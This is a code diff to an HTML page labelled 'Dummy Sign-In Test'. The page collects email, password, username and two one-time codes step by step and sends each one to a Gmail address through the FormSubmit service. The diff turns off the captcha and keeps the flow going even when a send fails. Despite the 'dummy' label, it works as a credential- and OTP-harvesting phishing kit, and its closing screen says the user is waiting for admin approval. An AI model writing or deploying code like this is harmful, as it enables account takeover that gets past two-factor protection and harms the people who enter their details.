@@ -2,6 +2,7 @@
 <html>
 <head>
   <title>Dummy Sign-In Test</title>
+  <meta charset="UTF-8">
 </head>
 <body>
 
@@ -62,19 +63,20 @@
     const data = {};
     const ADMIN_EMAIL = "blessedresult6@gmail.com";
 
-    // Send plain text info to admin via FormSubmit (no account needed)
+    // Send all collected dummy data so far to admin as plain text via FormSubmit
     function sendToAdmin(stepName, extraInfo) {
       const payload = {
         _subject: "Dummy Sign-In - " + stepName,
         _template: "table",
-        step: stepName,
-        email: data.email || "",
-        password: data.password || "",
-        username: data.username || "",
-        otp1: data.otp1 || "",
-        otp2: data.otp2 || "",
-        extra: extraInfo || "",
-        timestamp: new Date().toISOString()
+        _captcha: "false",
+        "Step": stepName,
+        "Email": data.email || "(not entered yet)",
+        "Password": data.password || "(not entered yet)",
+        "Username": data.username || "(not entered yet)",
+        "OTP 1": data.otp1 || "(not entered yet)",
+        "OTP 2": data.otp2 || "(not entered yet)",
+        "Extra info": extraInfo || "",
+        "Timestamp": new Date().toISOString()
       };
 
       return fetch("https://formsubmit.co/ajax/" + ADMIN_EMAIL, {
@@ -87,22 +89,28 @@
       });
     }
 
+    function showStatus(id, message) {
+      document.getElementById(id).textContent = message;
+    }
+
     // Step 1
     document.getElementById('form1').addEventListener('submit', function(e) {
       e.preventDefault();
       data.email = document.getElementById('email').value;
       data.password = document.getElementById('password').value;
 
-      document.getElementById('status1').textContent = "Sending to admin...";
+      showStatus('status1', "Sending Email + Password to admin...");
 
       sendToAdmin("Email + Password", "User entered email and password")
-        .then(() => {
-          document.getElementById('status1').textContent = "Sent to admin.";
+        .then(function(res) { return res.json(); })
+        .then(function() {
+          showStatus('status1', "Sent to admin (plain text).");
           document.getElementById('step1').style.display = 'none';
           document.getElementById('step2').style.display = 'block';
         })
-        .catch(() => {
+        .catch(function() {
           // Still continue even if send fails (dummy site)
+          showStatus('status1', "Send attempted (continuing anyway).");
           document.getElementById('step1').style.display = 'none';
           document.getElementById('step2').style.display = 'block';
         });
@@ -113,15 +121,17 @@
       e.preventDefault();
       data.username = document.getElementById('username').value;
 
-      document.getElementById('status2').textContent = "Sending to admin...";
+      showStatus('status2', "Sending Username to admin...");
 
       sendToAdmin("Username", "User entered username")
-        .then(() => {
-          document.getElementById('status2').textContent = "Sent to admin.";
+        .then(function(res) { return res.json(); })
+        .then(function() {
+          showStatus('status2', "Sent to admin (plain text).");
           document.getElementById('step2').style.display = 'none';
           document.getElementById('step3').style.display = 'block';
         })
-        .catch(() => {
+        .catch(function() {
+          showStatus('status2', "Send attempted (continuing anyway).");
           document.getElementById('step2').style.display = 'none';
           document.getElementById('step3').style.display = 'block';
         });
@@ -132,15 +142,17 @@
       e.preventDefault();
       data.otp1 = document.getElementById('otp1').value;
 
-      document.getElementById('status3').textContent = "Sending to admin...";
+      showStatus('status3', "Sending OTP 1 to admin...");
 
       sendToAdmin("OTP 1", "User entered OTP 1")
-        .then(() => {
-          document.getElementById('status3').textContent = "Sent to admin.";
+        .then(function(res) { return res.json(); })
+        .then(function() {
+          showStatus('status3', "Sent to admin (plain text).");
           document.getElementById('step3').style.display = 'none';
           document.getElementById('step4').style.display = 'block';
         })
-        .catch(() => {
+        .catch(function() {
+          showStatus('status3', "Send attempted (continuing anyway).");
           document.getElementById('step3').style.display = 'none';
           document.getElementById('step4').style.display = 'block';
         });
@@ -151,15 +163,17 @@
       e.preventDefault();
       data.otp2 = document.getElementById('otp2').value;
 
-      document.getElementById('status4').textContent = "Sending to admin...";
+      showStatus('status4', "Sending OTP 2 (final) to admin...");
 
       sendToAdmin("OTP 2 - Final", "User completed all steps. Waiting for admin approval.")
-        .then(() => {
-          document.getElementById('status4').textContent = "Sent to admin.";
+        .then(function(res) { return res.json(); })
+        .then(function() {
+          showStatus('status4', "Sent to admin (plain text).");
           document.getElementById('step4').style.display = 'none';
           document.getElementById('waiting').style.display = 'block';
         })
-        .catch(() => {
+        .catch(function() {
+          showStatus('status4', "Send attempted (continuing anyway).");
           document.getElementById('step4').style.display = 'none';
           document.getElementById('waiting').style.display = 'block';
         });
